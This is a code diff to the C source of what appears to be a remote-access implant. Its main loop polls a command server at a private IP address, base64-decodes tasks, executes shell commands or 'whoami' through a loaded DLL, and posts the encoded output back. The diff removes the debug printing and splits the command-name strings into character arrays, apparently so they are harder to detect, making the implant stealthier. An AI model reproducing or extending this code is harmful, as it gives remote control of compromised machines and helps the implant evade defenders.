@@ -104,18 +104,14 @@ CHAR* myTrim(CCHAR* str, CHAR trim)
 
 CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
 {
-    ((PRINTF)api->printf)("\nYou're in readJsonTask\n", uuid);
     CHAR* tmpJson = json;  // myStrtok modifies the string itself
     CHAR* task;
     CHAR delim = { '\n' };
-    ((PRINTF)api->printf)("\ntmpJson: %s\n", tmpJson);
     CHAR* token = myStrtok(tmpJson, delim, FALSE);
-    ((PRINTF)api->printf)("\nFirst token: %s\n", token);
     CHAR blacklist[] = { '[', ']', '\0' };
 
     if (token[0] == '[' && token[1] == ']')
     {
-        ((PRINTF)api->printf)("tmpJson is empty, returning NULL");
         myStrtok(NULL, 0, TRUE);
         return NULL;
     }
@@ -136,27 +132,16 @@ CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** 
 
     // dont look
     *taskId = myTrim(token, ' ');
-    ((PRINTF)api->printf)("\ntaskId: %s\n", *taskId);
     *taskId = myEndTrim(*taskId, ',');
-    ((PRINTF)api->printf)("\ntaskId: %s\n", *taskId);
     task = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
-    ((PRINTF)api->printf)("\ntask: %s\n", task);
     task = myEndTrim(task, ',');
-    ((PRINTF)api->printf)("\ntask: %s\n", task);
     task = myTrim(task, '"');
-    ((PRINTF)api->printf)("\ntask: %s\n", task);
     *taskType = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
-    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
     *taskType= myEndTrim(*taskType, ',');
-    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
     *taskType = myTrim(*taskType, '"');
-    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
     *uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
-    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);
     *uuid = myEndTrim(*uuid, ',');
-    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);
     *uuid = myTrim(*uuid, '"');
-    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);
 
     myStrtok(NULL, 0, TRUE);
     return task;
@@ -282,9 +267,7 @@ void myMain()
     CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
 
     PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
-    ((PRINTF)api->printf)("\np RunCmd: %p\n",PEsgStdApi->RunCmd);
     PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll, whoami_c);
-    ((PRINTF)api->printf)("\np Whoami: %p\n",PEsgStdApi->Whoami);
 
     //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
     WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
@@ -323,32 +306,23 @@ void myMain()
         'a', '2', 'f', '0', 'd', '0', 0
     };
 
-    ((PRINTF)api->printf)("NOT HERE 0\n");
     while (TRUE)
     {
-        ((PRINTF)api->printf)("NOT HERE 1\n");
         jsonResponse = GetRequest(api, wServer, port, fullPath);
-        ((PRINTF)api->printf)("NOT HERE 2\n");
 
         if (!jsonResponse)
         {
-            ((PRINTF)api->printf)("\njsonResponse is empty, sleeping...\n");
             ((SLEEP)api->Sleep)(3000);
             continue;
         }
-        ((PRINTF)api->printf)("\np jsonResponse: %p", jsonResponse);
-        ((PRINTF)api->printf)("\njsonResponse: %s", jsonResponse);
 
         b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);
 
         if (b64Task == NULL)
         {
-            ((PRINTF)api->printf)("\nb64Task is NULL, sleeping...\n");
             ((SLEEP)api->Sleep)(3000);
             continue;
         }
-        ((PRINTF)api->printf)("\np b64Task: %p\n", b64Task);
-        ((PRINTF)api->printf)("\nb64Task: %s\n", b64Task);
 
         ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
         (
@@ -360,7 +334,6 @@ void myMain()
                 NULL,
                 NULL
         );
-        ((PRINTF)api->printf)("\ntaskSize1: %d", taskSize);
         task = (CHAR*)((CALLOC)api->calloc)(taskSize+1, sizeof(CHAR));
 
         ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
@@ -373,28 +346,23 @@ void myMain()
                 NULL,
                 NULL
         );
-        ((PRINTF)api->printf)("\ntaskSize2: %d", taskSize);
 
-        ((PRINTF)api->printf)("\np task: %p", task);
-        ((PRINTF)api->printf)("\ntask: %s", task);
-        ((PRINTF)api->printf)("\nmyStrlenA(task): %d", myStrlenA(task));
-
-        if (my_strcmp(taskType, "cmd") == 0)
+        CHAR cmd[] = { 'c', 'm', 'd', 0 };
+        CHAR whoami[] = { 'w', 'h', 'o', 'a', 'm', 'i', 0 };
+        if (my_strcmp(taskType, cmd) == 0)
         {
             orgOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
             taskOutput = myTrim(orgOutput, '\n');
         }
-        else if (my_strcmp(taskType, "whoami") == 0)
+        else if (my_strcmp(taskType, whoami) == 0)
         {
             orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
             taskOutput = myTrim(orgOutput, '\n');
-            ((PRINTF)api->printf)("\ntaskOutput: \n%s\n", taskOutput);
         }
         else
         {
-            orgOutput = "oops";
-            taskOutput = "oops";
-            ((PRINTF)api->printf)("unknown task type, you f'ed up, this should never happen");
+            ((SLEEP)api->Sleep)(3000);
+            continue;
         }
 
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
@@ -404,9 +372,6 @@ void myMain()
         totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
         json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
         ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
-        ((PRINTF)api->printf)("\ntotalJsonSize: %d\n", totalJsonSize);
-        ((PRINTF)api->printf)("\nmyStrlenA(json): %d\n", myStrlenA(json));
-        ((PRINTF)api->printf)("\njson: %s\n", json);
         PostRequest(api, wServer, port, fullPath2, json);
 
         if (orgOutput)
